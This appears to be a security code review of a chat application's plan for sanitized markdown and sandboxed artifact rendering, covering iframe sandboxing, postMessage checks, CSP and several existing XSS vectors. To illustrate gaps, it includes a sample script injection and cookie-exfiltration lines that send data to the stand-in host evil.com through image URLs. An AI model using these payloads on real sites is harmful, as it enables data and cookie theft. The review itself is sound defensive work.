# Code Review: Phase 1 (Security Foundation) & Phase 4 (Sandboxed Rendering)

**Date:** 2026-03-15
**Reviewer:** code-reviewer
**Scope:** Plan review + codebase cross-reference
**Status:** Report only (no edits)

---

## Overall Assessment

The security architecture is **fundamentally sound**. The plan correctly identifies the main attack surfaces and proposes industry-standard mitigations. However, there are **5 issues** ranging from Critical to Medium that need attention before implementation.

---

## Question 1: DOMPurify vs rehype-sanitize — do we need both?

**Verdict: Yes, both are needed. The plan's approach is correct.**

- `rehype-sanitize` operates at the hast (HTML AST) level inside the react-markdown pipeline. It is the right tool for markdown-rendered content because it integrates with the rehype plugin chain without double-parsing.
- `DOMPurify` is needed for raw HTML strings that bypass react-markdown: `HtmlPreview` (line 588), SVG artifacts (Phase 4), and the MCP `ServerLogo` component (McpDialog.tsx line 53).
- The plan correctly uses rehype-sanitize for markdown and DOMPurify for non-markdown HTML. No redundancy.

**One gap:** The plan does NOT address `McpDialog.tsx:53` — `dangerouslySetInnerHTML={{ __html: logo }}` where `logo` is SVG from MCP server config. This is a pre-existing XSS vector outside the artifact plan's scope, but worth noting.

---

## Question 2: iframe sandbox attributes — is `allow-scripts` without `allow-same-origin` sufficient?

**Verdict: Mostly correct, with one CRITICAL issue.**

`sandbox="allow-scripts"` without `allow-same-origin` gives the iframe an opaque origin, which prevents:
- Access to parent DOM, cookies, localStorage
- Access to parent's fetch credentials
- Reading parent URL or window properties

**CRITICAL ISSUE: `openFullView()` in HtmlPreview (line 591-598) creates a blob URL and opens it in `window.open`.**

```typescript
const blob = new Blob([html], { type: "text/html" });
const url = URL.createObjectURL(blob);
window.open(url, "_blank");
```

Blob URLs inherit the **parent page's origin**. This means unsanitized HTML opened in a new tab has **full same-origin access** to the parent page — cookies, localStorage, fetch with credentials. The Phase 1 plan adds DOMPurify to HtmlPreview's `srcDoc`, but the `openFullView` function uses the **original unsanitized `html` prop** to create the blob, not the sanitized version.

**Recommendation:** The fullscreen blob must use the sanitized HTML, and ideally include the same CSP meta tag:
```typescript
const blob = new Blob([wrappedSanitizedHtml], { type: "text/html" });
```

Phase 4's `SandboxedIframe` does not include a fullscreen feature itself (it delegates to `ArtifactCard`), but the same pattern will apply — ensure the fullscreen blob uses sanitized content.

**Secondary concern for React artifacts:** `sandbox="allow-scripts"` without `allow-same-origin` means `localStorage`, `sessionStorage`, `IndexedDB`, and `fetch` with cookies are all blocked. The React CDN scripts load via `<script src=...>` tags, and this WILL work because the CSP allows `script-src` from jsdelivr/unpkg. However, any React artifact that tries to use `fetch()` to an API will fail silently because `connect-src 'none'` in the CSP blocks it. The plan acknowledges this (`connect-src 'none'` prevents data exfiltration). This is correct behavior — artifact code should not make network requests.

**One nuance:** `allow-scripts` without `allow-same-origin` means `<script src="https://cdn.jsdelivr.net/...">` loads will work (external scripts are allowed by `allow-scripts`), but the iframe cannot set cookies or use credentialed requests. This is fine for CDN scripts.

---

## Question 3: Can `<artifact>` XML markers be injected by malicious user input?

**Verdict: YES — this is a HIGH priority issue.**

The Phase 3 plan adds this regex to `parseMessageBlocks()`:
```typescript
const artifactRe = /<artifact\s+type=["'](\w+)["']\s+title=["']([^"']+)["']\s*>([\s\S]*?)<\/artifact>/i;
```

`parseMessageBlocks()` runs on **all message text** (line 1927). If a user sends a chat message containing:
```
<artifact type="html" title="Gotcha"><script>alert('xss')</script></artifact>
```

This would be parsed as an HTML artifact and rendered in a sandboxed iframe. The `<script>` would execute inside the sandbox (which is the intended behavior for artifacts).

**Attack vectors:**
1. **Social engineering via fake artifacts:** A user could inject a fake artifact that looks like system output. Other users in the channel might trust it as agent-generated.
2. **Resource exhaustion:** Inject a React artifact with an infinite loop — Babel compiles and runs it, potentially freezing the iframe (contained, but bad UX).
3. **Phishing within sandbox:** The iframe can render arbitrary HTML that looks like a login form. Users might enter credentials into an iframe that (due to `connect-src 'none'`) can't exfiltrate them via fetch — but it CAN use `parent.postMessage()` to send data to the parent, and the parent's message handler only filters by `ev.source` check, not by message type schema.

**Recommendations:**
1. **Differentiate agent vs user messages.** Only parse `<artifact>` markers in messages from agent/bot users. User messages should strip or escape artifact tags. The `subtype` field on `Message` (line 25: `subtype?: string`) or a `user` field check can gate this.
2. **Strict postMessage schema validation.** The handler should reject any message whose `type` field is not exactly `"artifact-resize"` or `"artifact-error"`. Currently Phase 4's handler does this correctly, but document it as a requirement.
3. **Rate-limit or size-limit artifact content** to prevent resource exhaustion.

---

## Question 4: Is the postMessage API for iframe height communication secure?

**Verdict: Partially secure. Needs tightening.**

**Phase 4's SandboxedIframe handler (artifact-sandbox.tsx):**
```typescript
if (ev.source !== iframeRef.current?.contentWindow) return;
```
This is the correct primary check — only accept messages from the specific iframe instance. Good.

**However, the existing `IframePreviewCard` (line 357-397) has a weaker check:**
```typescript
const fromThisFrame = ev.source === iframeRef.current.contentWindow;
const fromTrustedOrigin = IFRAME_RESIZE_ORIGINS.test(ev.origin ?? "");
if (!fromThisFrame && !fromTrustedOrigin) return;
```

The `fromTrustedOrigin` fallback accepts messages from any Datawrapper origin even if `ev.source` does not match. This is intentional for third-party embeds but means any Datawrapper embed on any page could send resize messages. Acceptable tradeoff for existing iframe embeds but should NOT be carried to artifact iframes.

**Phase 4 postMessage issues:**

1. **The iframe sends `parent.postMessage(..., "*")`** — the wildcard target is fine for sandboxed iframes (they cannot know the parent origin anyway due to opaque origin). This is correct.

2. **Missing height validation bounds in the iframe-side script.** The `RESIZE_SCRIPT` sends raw `scrollHeight`. A malicious artifact could set `document.body.style.height = "999999px"` to force the parent to allocate a huge iframe. The parent caps at `MAX_HEIGHT = 800`, so impact is limited. Acceptable.

3. **`artifact-error` message type leaks error strings to parent.** A crafted artifact could send fake error messages to display arbitrary text in the error banner. Impact: LOW (cosmetic, text is rendered as `textContent` not innerHTML). Acceptable.

**Recommendation:** Phase 4's approach is sound. No changes needed for the new artifact iframes. The existing `IframePreviewCard` is a separate concern.

---

## Question 5: XSS vectors in the current codebase NOT addressed by the plan

**Found 3 pre-existing XSS vectors:**

### 5a. McpDialog.tsx line 53 — SVG injection (MEDIUM)
```typescript
<span dangerouslySetInnerHTML={{ __html: logo }} />
```
Where `logo` comes from MCP server config. If a malicious MCP server provides SVG with `<script>` or `onload` handlers, this executes in the main page context.

**Fix:** `DOMPurify.sanitize(logo, { USE_PROFILES: { svg: true } })` before injection.

### 5b. ProjectsDialog.tsx line 540 — Prism highlight output (LOW)
```typescript
dangerouslySetInnerHTML={{ __html: highlightCode(line, selectedFile.language) }}
```
`highlightCode` calls `Prism.highlight()` which produces HTML tokens. Prism itself escapes input when no grammar matches (line 24: HTML entity escaping). When a grammar IS matched, Prism's tokenizer could theoretically produce unsafe output if given adversarial input, but this is an extremely unlikely attack vector since it requires controlling file content displayed in the projects dialog.

**Fix:** Low priority but could wrap output in DOMPurify for defense in depth.

### 5c. MermaidDiagram line 321 — SVG output (ADDRESSED by plan)
```typescript
<div dangerouslySetInnerHTML={{ __html: svg }} />
```
Mermaid with `securityLevel: "loose"` could produce SVG with event handlers. Phase 1 changes this to `"strict"` which mitigates it. Correctly addressed.

### 5d. rehype-raw without sanitization — MessageComposer.tsx (MEDIUM)
```typescript
// MessageComposer.tsx line 4-5
import rehypeRaw from "rehype-raw";
```
The plan addresses MessageList.tsx and MarkdownContent.tsx but does NOT mention MessageComposer.tsx, which also uses `rehype-raw`. If the composer renders markdown previews with user-provided content, this is an unsanitized path.

**Fix:** Add rehype-sanitize to MessageComposer.tsx's rehype pipeline as well.

---

## Question 6: Is Babel standalone in iframe a security risk?

**Verdict: Acceptable risk, properly isolated.**

Babel standalone enables arbitrary JavaScript execution — that is its purpose. The security model is:

1. **Iframe sandbox isolation:** `allow-scripts` without `allow-same-origin` means the code runs in an opaque-origin context. It cannot access parent DOM, cookies, storage, or credentialed network.
2. **CSP restricts network:** `connect-src 'none'` prevents the artifact from exfiltrating data via fetch/XHR/WebSocket. However...

**MEDIUM ISSUE: CSP `connect-src 'none'` does not block all exfiltration channels.**

- `<img src="https://evil.com/steal?data=...">` is allowed by `img-src data: https:`. The artifact could encode stolen data in image URLs.
- `<link rel="stylesheet" href="https://evil.com/steal?data=...">` — no `style-src` URL restriction (only `'unsafe-inline'` is listed, but CSP `style-src` with `'unsafe-inline'` does NOT implicitly allow external stylesheets in all browsers — actually it does NOT allow `https:` loads since only `'unsafe-inline'` is listed). This is fine.
- Navigation: `window.location = "https://evil.com"` — the iframe has `allow-scripts` but NOT `allow-top-navigation`, so it cannot navigate the parent. It CAN navigate itself, but that just loads a page in the sandboxed iframe. Acceptable.

**Exfiltration via img-src is the real gap.** An artifact could do:
```javascript
new Image().src = `https://evil.com/log?cookie=${document.cookie}`;
```
But `document.cookie` is empty (opaque origin, no cookies). The artifact has no access to parent data. The only data it could exfiltrate is its own source code (which the user already sees) or data the user types into the artifact. For a React artifact with input fields, a user typing sensitive data into the artifact's form could have that data exfiltrated via img-src.

**Recommendation:** Tighten CSP to `img-src data: blob:` (remove `https:`) if artifacts don't need external images. If they do, accept this as a known limitation and document it. Alternatively, add a user-visible warning: "This artifact can load external resources."

**Babel-specific risk:** Babel's `eval`-based compilation is allowed by `'unsafe-eval'` in the CSP. This is necessary for JSX transpilation. The sandbox ensures this eval runs in an isolated context. Acceptable.

---

## Edge Cases Found by Scout

1. **Streaming artifacts:** If the agent streams its response, `parseMessageBlocks()` may match a partial `<artifact>` tag during streaming, causing flicker or parse errors as content arrives. The plan does not address incremental parsing. Recommendation: debounce artifact parsing or require the closing `</artifact>` tag before rendering.

2. **Nested artifacts:** `<artifact>` inside `<artifact>` — the non-greedy `[\s\S]*?` regex would match the inner closing tag, breaking the outer artifact. Recommendation: document that nesting is not supported; the regex naturally handles this by matching the first `</artifact>`.

3. **Very large artifacts:** An HTML artifact containing 1MB+ of content passed through DOMPurify is CPU-intensive. `DOMPurify.sanitize()` on the main thread could block UI. Recommendation: add a size check before sanitization; artifacts over a threshold (e.g., 500KB) get a "too large to preview" fallback.

4. **CSP violation logging:** The CSP meta tag in iframe has no `report-uri`. CSP violations fail silently, making debugging hard. Not a security issue but a DX concern.

---

## Summary of Issues

| # | Severity | Issue | Location |
|---|----------|-------|----------|
| 1 | **CRITICAL** | `openFullView()` blob URL uses unsanitized HTML, inherits parent origin | MessageList.tsx:591-598 (existing), must be fixed in Phase 1 |
| 2 | **HIGH** | `<artifact>` markers parseable from user messages — spoofing/phishing | Phase 3 regex in parseMessageBlocks, gate on message author |
| 3 | **MEDIUM** | McpDialog.tsx SVG injection via `dangerouslySetInnerHTML` | McpDialog.tsx:53, not in plan scope |
| 4 | **MEDIUM** | MessageComposer.tsx uses rehype-raw without sanitization | MessageComposer.tsx:5, not addressed in Phase 1 |
| 5 | **MEDIUM** | CSP `img-src https:` allows data exfiltration from React artifacts | Phase 4 artifact-templates.ts CSP |
| 6 | **LOW** | Streaming may cause partial artifact parse flicker | Phase 3 parseMessageBlocks |

---

## Recommended Actions (Priority Order)

1. **Phase 1 — Fix `openFullView()` blob URL** to use sanitized + CSP-wrapped HTML. This is a pre-existing vulnerability that Phase 1 must address.
2. **Phase 3 — Gate artifact parsing on message author.** Only parse `<artifact>` tags in agent/bot messages. User messages should escape or strip them.
3. **Phase 1 — Add MessageComposer.tsx** to the rehype-sanitize integration list.
4. **Phase 4 — Consider tightening** CSP `img-src` to `data: blob:` unless external images are required.
5. **Phase 1 — Note McpDialog.tsx** SVG sanitization as out-of-scope but create a follow-up task.
6. **Phase 3/4 — Add artifact size limit** before DOMPurify processing.

---

## Positive Observations

- Correct decision to use rehype-sanitize in the markdown pipeline and DOMPurify for raw HTML — avoids double-parsing.
- `sandbox="allow-scripts"` without `allow-same-origin` is the right isolation model.
- postMessage handler in Phase 4 correctly validates `ev.source` against the specific iframe ref.
- CSP meta tag in iframe documents is good defense-in-depth.
- The plan correctly identifies mermaid `securityLevel: "loose"` as a risk and fixes it.
- Plugin order correction (raw -> sanitize -> katex) is correct and important.

---

## Unresolved Questions

1. Should the fullscreen/new-tab feature for artifacts also use a sandboxed window? `window.open` with blob URL has no sandbox. Consider using a `data:` URI (has `null` origin) or an intermediate page that embeds a sandboxed iframe.
2. Does the Tailwind CDN script (`https://cdn.tailwindcss.com`) introduce supply-chain risk? It loads arbitrary JS from a CDN into every React artifact iframe. Consider pinning to a specific version via jsdelivr or bundling.
3. The plan lists `'unsafe-eval'` in CSP for Babel — does this also enable `eval()` in HTML artifacts? Yes, because the same CSP template is used. Consider separate CSP profiles for HTML vs React artifacts (HTML does not need `'unsafe-eval'`).
